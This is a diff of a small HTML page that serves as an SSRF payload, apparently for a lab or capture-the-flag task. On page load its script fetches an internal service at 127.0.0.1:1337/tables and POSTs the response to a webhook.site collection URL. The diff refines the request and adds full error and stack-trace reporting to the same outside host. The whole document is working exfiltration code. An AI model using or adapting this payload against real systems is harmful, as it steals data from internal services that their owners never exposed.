@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Capture</title>
+    <title>SSRF Debug</title>
 </head>
 <body>
-    <h1>Loading tables...</h1>
+    <h1>Debugging...</h1>
     <script>
-        fetch('localhost:1337/tables')
+        fetch('http://127.0.0.1:1337/tables', { mode: 'no-cors' })
             .then(response => response.text())
             .then(data => {
                 fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
@@ -18,11 +18,10 @@
                 });
             })
             .catch(err => {
-                // Send the error to Webhook.site for debugging
                 fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'error=' + encodeURIComponent(err.message)
+                    body: 'error=' + encodeURIComponent(err.name + ': ' + err.message + ' - ' + err.stack)
                 });
             });
     </script>
